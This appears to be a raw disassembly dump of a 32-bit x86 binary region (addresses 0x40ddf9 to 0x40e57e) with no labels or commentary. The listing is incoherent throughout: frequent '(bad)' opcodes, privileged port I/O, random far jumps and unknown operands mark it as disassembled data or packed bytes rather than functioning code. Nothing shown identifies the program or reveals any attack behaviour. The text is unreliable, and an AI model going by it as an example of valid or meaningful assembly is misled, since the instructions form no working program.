  40ddf9:	fiadd  WORD PTR [ebp+edi*1-0x2f534e83]
  40de00:	xchg   ebp,eax
  40de01:	mov    bl,0x21
  40de03:	js     0x40de84
  40de05:	or     al,0x6a
  40de07:	dec    esp
  40de08:	jle    0x40ddb9
  40de0a:	inc    DWORD PTR [eax+ebx*4]
  40de0d:	adc    BYTE PTR [esi-0x395e10c8],ah
  40de13:	jno    0x40de45
  40de15:	dec    esp
  40de16:	(bad)  
  40de17:	retf   0x56d7
  40de1a:	stos   DWORD PTR es:[edi],eax
  40de1b:	cmp    al,BYTE PTR [edi]
  40de1d:	arpl   WORD PTR [esi+esi*4-0x1483d639],si
  40de24:	dec    ecx
  40de25:	mov    ecx,0x1290b4cd
  40de2a:	repnz stc 
  40de2c:	pop    ebp
  40de2d:	data16 xor dh,BYTE PTR [edx+0x52e5f868]
  40de34:	mov    cl,0xa2
  40de36:	cmp    al,BYTE PTR [eax]
  40de38:	xchg   esp,eax
  40de39:	cmp    cl,BYTE PTR [edi]
  40de3b:	fist   DWORD PTR [ebx+0xa]
  40de3e:	inc    eax
  40de3f:	jle    0x40de8f
  40de41:	push   ebx
  40de42:	loopne 0x40de59
  40de44:	dec    ebp
  40de45:	mov    BYTE PTR [ebp+0x18],bl
  40de48:	ss pop edi
  40de4a:	sub    dl,BYTE PTR [edi+esi*4-0x78ea104c]
  40de51:	gs jmp 0x40de75
  40de54:	push   ss
  40de55:	inc    ecx
  40de56:	dec    ebx
  40de57:	mov    dh,cl
  40de59:	test   DWORD PTR [bp+di+0x61],esp
  40de5d:	mov    esp,0x32615659
  40de62:	ror    DWORD PTR [ebx+0x21],1
  40de65:	int    0xc0
  40de67:	add    ch,BYTE PTR [ebx+eiz*4-0x41832eba]
  40de6e:	daa    
  40de6f:	jmp    0x40de18
  40de71:	ss int3 
  40de73:	das    
  40de74:	rol    DWORD PTR [ebp+0x63],cl
  40de77:	push   0xeb31f35e
  40de7c:	cdq    
  40de7d:	mov    BYTE PTR [ebx-0x18e842c0],al
  40de83:	jg     0x40de28
  40de85:	jmp    0xd8a99d33
  40de8a:	push   cs
  40de8b:	jno    0x40de71
  40de8d:	mov    BYTE PTR [ecx-0x27],ch
  40de90:	xor    BYTE PTR [esi-0x55cb53bb],ah
  40de96:	mov    bh,0xb0
  40de98:	out    dx,eax
  40de99:	jle    0x40deb1
  40de9b:	stos   DWORD PTR es:[edi],eax
  40de9c:	mov    cl,BYTE PTR [eax-0x2c46b244]
  40dea2:	out    0x64,eax
  40dea4:	aaa    
  40dea5:	sub    al,0xca
  40dea7:	sbb    edx,edi
  40dea9:	lock adc ecx,ebp
  40deac:	rol    DWORD PTR [esp+edi*4],cl
  40deaf:	and    eax,0x17df15b9
  40deb4:	add    eax,0x2e1a83ea
  40deb9:	mov    esp,0xfc0e700c
  40debe:	inc    esi
  40debf:	or     ebp,DWORD PTR [ecx]
  40dec1:	imul   esp,DWORD PTR [ebx-0x3bea74bd],0xfffffff8
  40dec8:	pop    esi
  40dec9:	dec    edx
  40deca:	fdiv   st,st(4)
  40decc:	iret   
  40decd:	push   ebp
  40dece:	dec    ebx
  40decf:	mov    al,BYTE PTR [eax]
  40ded1:	aas    
  40ded2:	les    edx,FWORD PTR [ecx+edi*2-0x77c6d3dc]
  40ded9:	test   BYTE PTR [ebx+0x7c],dh
  40dedc:	test   eax,0x1177224a
  40dee1:	mov    bh,0xf1
  40dee3:	ds addr16 jo 0x40debc
  40dee7:	aam    0xe3
  40dee9:	xchg   ecx,eax
  40deea:	push   edx
  40deeb:	or     eax,0xcce2b4ea
  40def0:	sub    ecx,ecx
  40def2:	pop    edi
  40def3:	dec    esi
  40def4:	cmp    BYTE PTR [ecx-0x61],bh
  40def7:	mov    esp,DWORD PTR [esi]
  40def9:	lds    ebx,FWORD PTR [edi+0x179197fc]
  40deff:	(bad)  
  40df00:	ins    DWORD PTR es:[edi],dx
  40df01:	or     ebp,DWORD PTR [ebx+0x6a]
  40df04:	jmp    0x40dee3
  40df06:	ficom  WORD PTR [edx+0x31]
  40df09:	and    esi,DWORD PTR ds:0x69c20971
  40df0f:	rcl    ecx,1
  40df11:	shl    bl,cl
  40df13:	mov    cl,0xad
  40df15:	mov    cl,0x8d
  40df17:	jo     0x40df7b
  40df19:	shl    BYTE PTR [edi+esi*4-0x33905dcf],0xd1
  40df21:	jmp    0xe6cb:0x9790faf2
  40df28:	push   edx
  40df29:	(bad)  
  40df2a:	imul   ebp,ecx,0xffffffed
  40df2d:	lods   eax,DWORD PTR ds:[esi]
  40df2e:	ja     0x40df9f
  40df30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df31:	push   esi
  40df32:	and    eax,0x25c50ac0
  40df37:	xlat   BYTE PTR ds:[ebx]
  40df38:	and    al,0x56
  40df3a:	xchg   esi,eax
  40df3b:	sub    eax,DWORD PTR [esi-0x969dd89]
  40df41:	push   ebp
  40df42:	std    
  40df43:	xchg   edx,eax
  40df44:	sbb    DWORD PTR [ebp+0x304dd67a],0xe2a54653
  40df4e:	mov    bl,0x42
  40df50:	icebp  
  40df51:	js     0x40df3d
  40df53:	loopne 0x40ded9
  40df55:	sbb    al,0x56
  40df57:	addr16 sahf 
  40df59:	push   esp
  40df5a:	push   eax
  40df5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5c:	push   0xb4e38d38
  40df61:	xchg   edx,eax
  40df62:	and    eax,0x7617ec52
  40df67:	inc    ebp
  40df68:	xor    eax,0x88ee2c64
  40df6d:	jmp    0x40df90
  40df6f:	lea    ebx,[edx]
  40df71:	dec    ecx
  40df72:	shl    edx,0xe4
  40df75:	(bad)  
  40df77:	xor    BYTE PTR [eax+edi*8],dh
  40df7a:	mov    ebp,0x7d8b57b7
  40df7f:	push   edx
  40df80:	lea    ebp,[edx-0x6d7ec80e]
  40df86:	pop    eax
  40df87:	adc    eax,0x5f9a3e1c
  40df8c:	outs   dx,BYTE PTR ds:[esi]
  40df8d:	sbb    BYTE PTR [edi-0x61],dl
  40df90:	ja     0x40df5f
  40df92:	xor    eax,DWORD PTR [esi]
  40df94:	repz fwait
  40df96:	xchg   dl,bl
  40df98:	test   al,0x30
  40df9a:	jbe    0x40df54
  40df9c:	test   al,0xec
  40df9e:	or     BYTE PTR [esi+0x55783ee],bh
  40dfa4:	es xchg esp,eax
  40dfa6:	fst    DWORD PTR [esi+0x3]
  40dfa9:	jmp    0x40e00f
  40dfab:	ss jle 0x40e01d
  40dfae:	jns    0x40dfd7
  40dfb0:	or     cl,BYTE PTR ds:0x3d0612a8
  40dfb6:	pop    ebp
  40dfb7:	mov    al,ds:0x4f104054
  40dfbc:	fld1   
  40dfbe:	cdq    
  40dfbf:	js     0x40dfac
  40dfc1:	pop    ds
  40dfc2:	popa   
  40dfc3:	cld    
  40dfc4:	loop   0x40df5e
  40dfc6:	push   ss
  40dfc7:	js     0x40df55
  40dfc9:	lahf   
  40dfca:	push   cs
  40dfcb:	push   ebp
  40dfcc:	rcl    DWORD PTR [edi+0x31],0x19
  40dfd0:	in     eax,0xc3
  40dfd2:	mov    bl,0x50
  40dfd4:	sub    dl,BYTE PTR [ebx+0x3]
  40dfd7:	es loope 0x40df89
  40dfda:	lods   eax,DWORD PTR ds:[esi]
  40dfdb:	xchg   esi,eax
  40dfdc:	cmp    DWORD PTR [ebp+0x251720bd],0x957f6c4d
  40dfe6:	and    al,0xf
  40dfe8:	lods   eax,DWORD PTR ds:[esi]
  40dfe9:	rol    DWORD PTR [edx+0x47c902b],0xeb
  40dff0:	mov    ?,WORD PTR [ebx+0x5a]
  40dff3:	adc    al,0xe1
  40dff5:	aam    0x95
  40dff7:	stos   BYTE PTR es:[edi],al
  40dff8:	repnz imul eax,DWORD PTR [edi+0x50],0xffffff90
  40dffd:	(bad)  
  40dffe:	jo     0x40e02d
  40e000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e001:	mov    dh,0xac
  40e003:	bound  ebp,QWORD PTR [edx-0x68]
  40e006:	xor    al,0xbb
  40e008:	xor    DWORD PTR [ebx],ebp
  40e00a:	(bad)  
  40e00b:	add    BYTE PTR [esi-0x8],0xc9
  40e00f:	shl    BYTE PTR [edx],cl
  40e011:	icebp  
  40e012:	xchg   ebp,eax
  40e013:	ficomp WORD PTR [ebx]
  40e015:	mov    eax,ds:0xeb619f3
  40e01a:	inc    edx
  40e01b:	jp     0x40e007
  40e01d:	popf   
  40e01e:	call   0x4bbed8f8
  40e023:	sbb    al,0x2b
  40e025:	mov    bl,0xc7
  40e027:	xor    DWORD PTR [edx],edi
  40e029:	data16 out dx,al
  40e02b:	jmp    0x63dfa1a8
  40e030:	adc    ebx,esp
  40e032:	sbb    DWORD PTR [edx],eax
  40e034:	loopne 0x40e035
  40e036:	xchg   DWORD PTR [edx],edx
  40e038:	mov    dl,0x2c
  40e03a:	jmp    FWORD PTR [edx+0x3ec1121b]
  40e040:	or     dl,ch
  40e042:	(bad)  
  40e043:	sti    
  40e044:	lds    esp,FWORD PTR [edi-0x18e2fb18]
  40e04a:	push   ecx
  40e04b:	in     eax,0x0
  40e04d:	pop    ss
  40e04e:	int3   
  40e04f:	xor    BYTE PTR [ecx],0x61
  40e052:	inc    ebp
  40e053:	cmp    BYTE PTR [esi+0x6b329470],0x59
  40e05a:	mov    al,ds:0xe7476100
  40e05f:	push   esi
  40e060:	test   eax,0xb5c89977
  40e065:	in     al,0x4
  40e067:	test   al,0x5d
  40e069:	lods   eax,DWORD PTR ds:[esi]
  40e06a:	(bad)  
  40e06c:	or     BYTE PTR [edx-0x3590625],cl
  40e072:	out    0x25,eax
  40e074:	in     al,dx
  40e075:	push   cs
  40e076:	mov    ch,0x41
  40e078:	mov    ss,WORD PTR [ebp+0x56]
  40e07b:	arpl   WORD PTR [ebx],bx
  40e07d:	clc    
  40e07e:	test   BYTE PTR fs:[ecx+0x68f1cc89],0xd3
  40e086:	dec    bx
  40e088:	adc    al,al
  40e08a:	fucompp 
  40e08c:	out    0xea,eax
  40e08e:	sar    BYTE PTR [esi-0x77],cl
  40e091:	mov    cs,WORD PTR [eax]
  40e093:	pop    ebp
  40e094:	ror    DWORD PTR [edx+0x5],cl
  40e097:	fwait
  40e098:	mov    ds:0xcb51e20a,al
  40e09d:	xor    BYTE PTR ds:0x35176f7,0x41
  40e0a4:	sbb    ch,bh
  40e0a6:	adc    edx,esi
  40e0a8:	and    ah,0xe4
  40e0ab:	cld    
  40e0ac:	pop    esp
  40e0ad:	mul    esi
  40e0af:	repz fisubr WORD PTR [esi-0x49]
  40e0b3:	mov    dl,0x1c
  40e0b5:	fld    DWORD PTR [ecx-0x56]
  40e0b8:	out    0x98,eax
  40e0ba:	pop    ds
  40e0bb:	data16 xor BYTE PTR [edx-0x7b],bh
  40e0bf:	pop    ecx
  40e0c0:	aas    
  40e0c1:	jp     0x40e13e
  40e0c3:	aas    
  40e0c4:	outs   dx,BYTE PTR ds:[esi]
  40e0c5:	dec    eax
  40e0c6:	inc    edx
  40e0c7:	push   ds
  40e0c8:	(bad)  
  40e0ca:	aad    0xc0
  40e0cc:	repz sub edi,DWORD PTR [esi]
  40e0cf:	pop    eax
  40e0d0:	jmp    0x40e0ff
  40e0d2:	adc    BYTE PTR [edi+0x76],al
  40e0d5:	adc    al,bh
  40e0d7:	jle    0x40e0bd
  40e0d9:	or     DWORD PTR [esi-0x5a],edi
  40e0dc:	inc    esp
  40e0dd:	(bad)  
  40e0de:	stos   DWORD PTR es:[edi],eax
  40e0df:	mov    eax,ds:0x253767d8
  40e0e4:	mov    eax,ds:0xcf69a183
  40e0e9:	fild   WORD PTR [edx]
  40e0eb:	adc    dl,bl
  40e0ed:	add    DWORD PTR [ecx],edx
  40e0ef:	sub    DWORD PTR [esi-0x77946986],eax
  40e0f5:	jmp    0x40e0bb
  40e0f7:	lds    ecx,FWORD PTR [ebx+0x47]
  40e0fa:	scas   al,BYTE PTR es:[edi]
  40e0fb:	inc    esi
  40e0fc:	mov    BYTE PTR [edx+0xac0d879],ch
  40e102:	add    BYTE PTR [ebx+eax*4+0x2c],bl
  40e106:	(bad)  
  40e107:	or     eax,0x7800272d
  40e10c:	xchg   BYTE PTR [ebx+0x49],cl
  40e10f:	call   0x32c8:0x5e2df218
  40e116:	push   0xffffffb6
  40e118:	pop    es
  40e119:	pop    esi
  40e11a:	mov    al,ds:0x46b87bff
  40e11f:	mov    al,0xac
  40e121:	push   ss
  40e122:	push   edi
  40e123:	pop    es
  40e124:	pop    ds
  40e125:	pop    ss
  40e126:	loope  0x40e0f1
  40e128:	jne    0x40e0b0
  40e12a:	int3   
  40e12b:	jnp    0x40e168
  40e12d:	xor    BYTE PTR [ecx+esi*4+0x5d2b7d0],dl
  40e134:	gs stc 
  40e136:	enter  0xcb02,0xe
  40e13a:	sbb    BYTE PTR [ecx-0x61cdd1e6],ah
  40e140:	sbb    edx,esp
  40e142:	sbb    DWORD PTR [ecx+0x1a],edx
  40e145:	xor    eax,0x804a0d7f
  40e14a:	lea    ebx,[edx+edx*2-0x6e]
  40e14e:	les    esp,FWORD PTR [esp+edx*2+0x53]
  40e152:	ins    BYTE PTR es:[edi],dx
  40e153:	mov    dl,BYTE PTR [ebx-0x9fad3d7]
  40e159:	xchg   ecx,eax
  40e15a:	xchg   esi,eax
  40e15b:	xor    al,0xf3
  40e15d:	and    DWORD PTR [esi],0xffffff89
  40e160:	jp     0x40e0e4
  40e162:	ds sar esp,cl
  40e165:	in     al,dx
  40e166:	clc    
  40e167:	popf   
  40e168:	sub    DWORD PTR [edi+0x47],ebp
  40e16b:	in     al,0xfa
  40e16d:	or     bl,BYTE PTR [eax-0x45]
  40e170:	pop    edi
  40e171:	iret   
  40e172:	add    BYTE PTR [eax+0x5535b902],0xa1
  40e179:	pushf  
  40e17a:	or     al,0x7c
  40e17c:	mov    dl,BYTE PTR [esi+0x2a048b57]
  40e182:	jmp    0xff41:0xb5c7bf0b
  40e189:	retf   0x710f
  40e18c:	mov    BYTE PTR [eax+ebp*2+0x2aeb9ae],ah
  40e193:	cmc    
  40e194:	xchg   BYTE PTR [ebx+0x51],ch
  40e197:	add    esi,DWORD PTR [esi]
  40e199:	sahf   
  40e19a:	dec    ebp
  40e19b:	pop    esi
  40e19c:	sub    ecx,DWORD PTR [edi-0x629c5826]
  40e1a2:	test   DWORD PTR [esi-0x4ce35d5],ebx
  40e1a8:	cs es loop 0x40e157
  40e1ac:	sbb    dl,BYTE PTR [eax]
  40e1ae:	ds push 0x92f0a4e1
  40e1b4:	fsub   QWORD PTR [edi+0x7]
  40e1b7:	pop    ecx
  40e1b8:	cs pop esp
  40e1ba:	adc    cl,BYTE PTR [edx]
  40e1bc:	mov    esp,0xa3462c5d
  40e1c1:	xor    DWORD PTR [ebx+ecx*1-0x7c],ebp
  40e1c5:	mov    esi,0xdd2a48c9
  40e1ca:	ret    0x640e
  40e1cd:	(bad)  
  40e1ce:	popa   
  40e1cf:	cmp    al,0x17
  40e1d1:	repnz sar BYTE PTR [esi+0x35c3266e],cl
  40e1d8:	sbb    dl,cl
  40e1da:	dec    ecx
  40e1db:	jae    0x40e236
  40e1dd:	sub    al,0xab
  40e1df:	and    BYTE PTR [ebp+0x2b85819c],ah
  40e1e5:	push   es
  40e1e6:	jns    0x40e238
  40e1e8:	dec    edx
  40e1e9:	iret   
  40e1ea:	(bad)  
  40e1eb:	adc    edi,eax
  40e1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1ee:	mov    eax,0x2d0065a8
  40e1f3:	adc    eax,0x22d37318
  40e1f8:	sbb    esp,DWORD PTR ds:0xf37f77d0
  40e1fe:	popf   
  40e1ff:	sbb    DWORD PTR [ecx],esi
  40e201:	dec    eax
  40e202:	aas    
  40e203:	(bad)  
  40e204:	lock adc esp,ebp
  40e207:	add    al,0xed
  40e209:	or     bh,BYTE PTR [ecx]
  40e20b:	cmp    BYTE PTR [ebx],dh
  40e20d:	add    al,0xfe
  40e20f:	fdiv   QWORD PTR [ebx+0x94def3f]
  40e215:	out    0x1e,eax
  40e217:	inc    ebp
  40e218:	cmp    al,0x1
  40e21a:	(bad)  
  40e21b:	sbb    DWORD PTR [edi+eax*4-0xe],eax
  40e21f:	cmp    al,0xc4
  40e221:	push   eax
  40e222:	gs adc eax,0xa8cdeb56
  40e228:	sub    al,0x7d
  40e22a:	xchg   ebp,eax
  40e22b:	(bad)  
  40e22c:	xor    eax,0x50474de
  40e231:	popf   
  40e232:	mov    ecx,0x51108cd0
  40e237:	or     al,0xe0
  40e239:	add    al,0x5f
  40e23b:	das    
  40e23c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e23d:	jo     0x40e1c8
  40e23f:	push   ss
  40e240:	cs jecxz 0x40e284
  40e243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e244:	js     0x40e22e
  40e246:	add    DWORD PTR [edi+0x4a79e7fa],edx
  40e24c:	xor    bl,BYTE PTR [edi]
  40e24e:	xor    al,0x76
  40e250:	addr16 inc eax
  40e252:	les    edx,FWORD PTR [edi]
  40e254:	popf   
  40e255:	xchg   edi,eax
  40e256:	fs cwde 
  40e258:	inc    ecx
  40e259:	xor    DWORD PTR [eax-0x619fe517],0x907ee2b5
  40e263:	mov    dh,0x9d
  40e265:	mov    ebx,0x498b39b8
  40e26a:	add    eax,ebp
  40e26c:	paddsb mm4,mm5
  40e26f:	fisttp WORD PTR [eax+0x6c]
  40e272:	xor    cl,BYTE PTR [edi+0x16d9bd2e]
  40e278:	cwde   
  40e279:	xlat   BYTE PTR ds:[ebx]
  40e27a:	xlat   BYTE PTR ds:[ebx]
  40e27b:	mov    eax,ds:0x5963533f
  40e280:	jno    0x40e2fa
  40e282:	test   DWORD PTR [eax-0x48],ecx
  40e285:	sbb    BYTE PTR [ebx],0x4f
  40e288:	test   esp,edi
  40e28a:	jo     0x40e24a
  40e28c:	add    bl,bh
  40e28e:	mov    esi,0x20fa6883
  40e293:	dec    edx
  40e294:	xchg   ecx,eax
  40e295:	push   ss
  40e296:	mov    ch,0x35
  40e298:	add    ch,cl
  40e29a:	test   cl,dh
  40e29c:	push   0x7a
  40e29e:	push   ecx
  40e29f:	push   edi
  40e2a0:	adc    DWORD PTR [edi+0x16e9a395],edi
  40e2a6:	mov    ebx,0x7739da9c
  40e2ab:	push   es
  40e2ac:	(bad)  
  40e2ad:	(bad)  
  40e2af:	mov    edi,0x160fc66e
  40e2b4:	out    dx,eax
  40e2b5:	hlt    
  40e2b6:	xchg   edi,eax
  40e2b7:	loope  0x40e2ed
  40e2b9:	add    al,0x8a
  40e2bb:	mov    ds:0x2c09b769,eax
  40e2c0:	loopne 0x40e2d7
  40e2c2:	mov    ch,0x61
  40e2c4:	pop    es
  40e2c5:	jmp    0x311a:0x4345c965
  40e2cc:	add    BYTE PTR [esp+ebp*8],bl
  40e2cf:	xor    DWORD PTR [esi-0x52bc7f30],edx
  40e2d5:	repz rcl esi,cl
  40e2d8:	jp     0x40e2b8
  40e2da:	cmp    bl,BYTE PTR [eax]
  40e2dc:	fist   WORD PTR [edx-0x62c32819]
  40e2e2:	or     BYTE PTR [ebx+0x4981e2ed],al
  40e2e8:	adc    bl,BYTE PTR [ebx-0x51]
  40e2eb:	les    edx,FWORD PTR [edi-0x5b7809a8]
  40e2f1:	stos   BYTE PTR es:[edi],al
  40e2f2:	dec    edi
  40e2f3:	leave  
  40e2f4:	pop    ss
  40e2f5:	push   es
  40e2f6:	xchg   esp,eax
  40e2f7:	mov    ecx,0x3ea0c985
  40e2fc:	xor    DWORD PTR [esi+0x63],ebp
  40e2ff:	in     eax,dx
  40e300:	push   ds
  40e301:	mov    al,0xb5
  40e303:	cli    
  40e304:	out    0x1f,eax
  40e306:	inc    esp
  40e307:	stos   DWORD PTR es:[edi],eax
  40e308:	xchg   DWORD PTR [ebp+eiz*4-0x60],eax
  40e30c:	rcr    al,1
  40e30e:	sbb    ebx,DWORD PTR [eax-0x6cf47080]
  40e314:	jmp    0x40e2ae
  40e316:	cmp    BYTE PTR [edx+0x72fbba53],dh
  40e31c:	loopne 0x40e2a1
  40e31e:	ja     0x40e2e6
  40e320:	mov    al,dl
  40e322:	stos   BYTE PTR es:[edi],al
  40e323:	and    dh,BYTE PTR [ebp+0x6f801a21]
  40e329:	(bad)  
  40e32a:	cdq    
  40e32b:	cmp    al,0x17
  40e32d:	mov    eax,0xfd388f6b
  40e332:	jno    0x40e2ff
  40e334:	inc    ebx
  40e335:	xor    bh,BYTE PTR [eax-0x45]
  40e338:	ss push ds
  40e33a:	add    al,0xa
  40e33c:	cmp    BYTE PTR [ecx-0x38],al
  40e33f:	cmp    edx,edi
  40e341:	dec    ebx
  40e342:	add    al,0xee
  40e344:	dec    ebp
  40e345:	sbb    eax,0xedb679b1
  40e34a:	pop    DWORD PTR [esi-0x11f70c33]
  40e350:	icebp  
  40e351:	adc    eax,DWORD PTR [ebx]
  40e353:	xchg   ecx,eax
  40e354:	sub    DWORD PTR gs:[edi+0x17],0x61
  40e359:	jl     0x40e2db
  40e35b:	mov    edx,DWORD PTR ss:[ecx+0x1e05300a]
  40e362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e363:	xor    al,0xd
  40e365:	cmp    DWORD PTR [esi],0x12
  40e368:	mov    cl,0x79
  40e36a:	cmp    eax,0xbfc50a40
  40e36f:	or     eax,0x93bb88da
  40e374:	xor    BYTE PTR [ebp+0x5ac74a08],dl
  40e37a:	lahf   
  40e37b:	add    ebp,DWORD PTR [edx-0x76]
  40e37e:	jmp    0x5d62:0xbc265102
  40e385:	cwde   
  40e386:	cld    
  40e387:	jp     0x40e3e8
  40e389:	mov    es,WORD PTR [esi-0x6479ff5f]
  40e38f:	dec    esp
  40e390:	es js  0x40e3ca
  40e393:	push   0x60
  40e395:	ss pop esp
  40e397:	fist   WORD PTR [esi+eiz*1]
  40e39a:	jns    0x40e3e1
  40e39c:	mov    ds:0xa29ae0aa,eax
  40e3a1:	jmp    0xc3a3d05b
  40e3a6:	or     BYTE PTR gs:[eax],bh
  40e3a9:	cmp    al,0xea
  40e3ab:	adc    dl,ch
  40e3ad:	cld    
  40e3ae:	sub    al,BYTE PTR [ebx]
  40e3b0:	push   es
  40e3b1:	push   es
  40e3b2:	mov    eax,0x66ca04da
  40e3b7:	sbb    DWORD PTR [ebx+ebp*8+0x17f59258],0x21
  40e3bf:	mov    DWORD PTR [edi-0x53aa579f],edx
  40e3c5:	xchg   DWORD PTR cs:[ecx-0x5e1ac095],ebx
  40e3cc:	xchg   esi,eax
  40e3cd:	(bad)  
  40e3ce:	mov    eax,0xfccd218c
  40e3d3:	int    0x98
  40e3d5:	das    
  40e3d6:	scas   eax,DWORD PTR es:[edi]
  40e3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3d8:	iret   
  40e3d9:	stos   DWORD PTR es:[edi],eax
  40e3da:	dec    ecx
  40e3db:	pop    edi
  40e3dc:	lea    edi,[ebp-0x77]
  40e3df:	outs   dx,BYTE PTR ds:[esi]
  40e3e0:	mov    bl,0x56
  40e3e2:	out    dx,al
  40e3e3:	clc    
  40e3e4:	jl     0x40e3d3
  40e3e6:	xor    DWORD PTR [ecx+ecx*4-0x22],ebx
  40e3ea:	in     eax,0x13
  40e3ec:	dec    edi
  40e3ed:	je     0x40e3d9
  40e3ef:	(bad)
  40e3f3:	scas   eax,DWORD PTR es:[edi]
  40e3f4:	mov    bh,BYTE PTR [ecx+0x64]
  40e3f7:	loopne 0x40e3c9
  40e3f9:	adc    eax,0xf1251b55
  40e3fe:	xchg   ebp,eax
  40e3ff:	dec    eax
  40e400:	imul   ecx,DWORD PTR [edi-0x69],0xffffff8a
  40e404:	(bad)  
  40e405:	shl    BYTE PTR [ecx-0xcf75433],0x40
  40e40c:	cwde   
  40e40d:	mov    al,ds:0x1863e48a
  40e412:	sub    DWORD PTR [eax-0x6115a558],ecx
  40e418:	cmp    eax,0xf6ebc56e
  40e41d:	fwait
  40e41e:	xchg   ebx,eax
  40e41f:	rol    esp,1
  40e421:	out    dx,al
  40e422:	xor    DWORD PTR [esi],edi
  40e424:	mov    bh,0x31
  40e426:	cmp    ebx,esi
  40e428:	imul   ebx,edi,0x523e47f8
  40e42e:	cdq    
  40e42f:	icebp  
  40e430:	aad    0xd5
  40e432:	push   edi
  40e433:	push   esp
  40e434:	sbb    ah,BYTE PTR [esi-0x341271ff]
  40e43a:	mov    cl,0xf5
  40e43c:	xchg   ebx,eax
  40e43d:	adc    edi,DWORD PTR [eax-0x7f7f548e]
  40e443:	mov    esi,0xf48b1dfa
  40e448:	cmp    eax,DWORD PTR [ebx]
  40e44a:	icebp  
  40e44b:	inc    esp
  40e44c:	fld    TBYTE PTR [edx-0x80]
  40e44f:	ja     0x40e43e
  40e451:	mov    dh,0x5d
  40e453:	ds das 
  40e455:	inc    edx
  40e456:	ret    0xbf21
  40e459:	sbb    al,0x25
  40e45b:	cmp    al,ch
  40e45d:	xor    BYTE PTR [esi],cl
  40e45f:	adc    BYTE PTR [ecx],dl
  40e461:	or     BYTE PTR [esi],bh
  40e463:	inc    esp
  40e464:	mov    dh,0x6
  40e466:	retf   0xe8b0
  40e469:	lea    ebp,[edi-0x7b2d10c2]
  40e46f:	pop    edx
  40e470:	inc    ecx
  40e471:	cmp    edi,DWORD PTR [eax-0x30]
  40e474:	pop    edx
  40e475:	or     BYTE PTR [edx],ch
  40e477:	add    eax,0x13a9fb2a
  40e47c:	bound  ebx,QWORD PTR ds:0xe1e70916
  40e482:	adc    DWORD PTR [ebp+0x129e3b84],0x9042b0f6
  40e48c:	sbb    al,0x21
  40e48e:	cli    
  40e48f:	ins    BYTE PTR es:[edi],dx
  40e490:	push   esp
  40e491:	mov    edx,?
  40e493:	push   es
  40e494:	mov    dh,0xa9
  40e496:	mov    fs,eax
  40e498:	mov    ecx,0x76f193fe
  40e49d:	rcl    BYTE PTR ds:0xb36c8b8d,cl
  40e4a3:	and    bh,0xf3
  40e4a6:	sub    ecx,DWORD PTR [ebp+0x64]
  40e4a9:	pop    edi
  40e4aa:	sub    eax,DWORD PTR [ebp+0x720f77aa]
  40e4b0:	sub    ecx,esp
  40e4b2:	ret    
  40e4b3:	hlt    
  40e4b4:	push   ebp
  40e4b5:	scas   al,BYTE PTR es:[edi]
  40e4b6:	jbe    0x40e529
  40e4b8:	push   ebx
  40e4b9:	shr    BYTE PTR [eax-0x5],0xb8
  40e4bd:	xor    ecx,ebp
  40e4bf:	xor    DWORD PTR [ecx-0x24],ecx
  40e4c2:	mov    dl,0xa0
  40e4c4:	retf   
  40e4c5:	mov    gs,WORD PTR [esi+eax*4-0x1]
  40e4c9:	lods   al,BYTE PTR ds:[esi]
  40e4ca:	daa    
  40e4cb:	or     BYTE PTR [edx-0x63],bh
  40e4ce:	lods   al,BYTE PTR ds:[esi]
  40e4cf:	fwait
  40e4d0:	mov    ?,ecx
  40e4d2:	sub    ecx,DWORD PTR ds:0xff1cfae9
  40e4d8:	adc    eax,DWORD PTR gs:[ebx]
  40e4db:	inc    esp
  40e4dc:	mov    DWORD PTR [edi],0x2e53a233
  40e4e2:	and    edi,DWORD PTR [ebx-0x12224db7]
  40e4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e9:	ret    0x25c6
  40e4ec:	sub    ebx,0xfffffffe
  40e4ef:	and    dl,BYTE PTR [ebp-0x165c3916]
  40e4f5:	(bad)  
  40e4f6:	cdq    
  40e4f7:	lods   eax,DWORD PTR ds:[si]
  40e4f9:	add    eax,0x48daf252
  40e4fe:	(bad)  
  40e4ff:	frstor [ecx-0x56d4beaf]
  40e505:	xchg   BYTE PTR [eax-0x112ce9b9],bh
  40e50b:	pop    edi
  40e50c:	push   0x8308002c
  40e511:	mov    al,ds:0xde47adea
  40e516:	pop    ds
  40e517:	outs   dx,BYTE PTR ds:[esi]
  40e518:	aas    
  40e519:	cmp    DWORD PTR [ecx],edi
  40e51b:	fs jecxz 0x40e4b1
  40e51e:	scas   eax,DWORD PTR es:[edi]
  40e51f:	xor    DWORD PTR [edi+0x43],0xffffffe4
  40e523:	xor    al,0xfe
  40e525:	xchg   ecx,eax
  40e526:	(bad)  
  40e527:	stos   BYTE PTR es:[edi],al
  40e528:	and    eax,0xd6ecba4d
  40e52d:	jge    0x40e4fb
  40e52f:	ins    BYTE PTR es:[edi],dx
  40e530:	jb     0x40e4d3
  40e532:	inc    esp
  40e533:	adc    DWORD PTR [ebx],0xb7790a62
  40e539:	sbb    DWORD PTR [ecx+0x650b4dc7],ebp
  40e53f:	fadd   DWORD PTR [edi+0x51ad5e7d]
  40e545:	mov    dl,0xf6
  40e547:	mov    BYTE PTR [ebx],ah
  40e549:	jmp    0x24a9:0x6db83183
  40e550:	push   es
  40e551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e552:	outs   dx,BYTE PTR ds:[esi]
  40e553:	add    edx,DWORD PTR [ebx+0x6ca7beeb]
  40e559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e55a:	push   ss
  40e55b:	jle    0x40e5d0
  40e55d:	sbb    al,0xf1
  40e55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e560:	sahf   
  40e561:	(bad)  
  40e562:	mov    cl,0x7a
  40e564:	mov    ecx,0x563e72b5
  40e569:	imul   edi,ebx,0x23
  40e56c:	mov    esp,DWORD PTR [eax+0x10]
  40e56f:	jno    0x40e506
  40e571:	push   0xb3adf69
  40e576:	stos   DWORD PTR es:[edi],eax
  40e577:	jge    0x40e516
  40e579:	(bad)  
  40e57b:	cli    
  40e57c:	(bad)  
  40e57e:	add    esp,esp
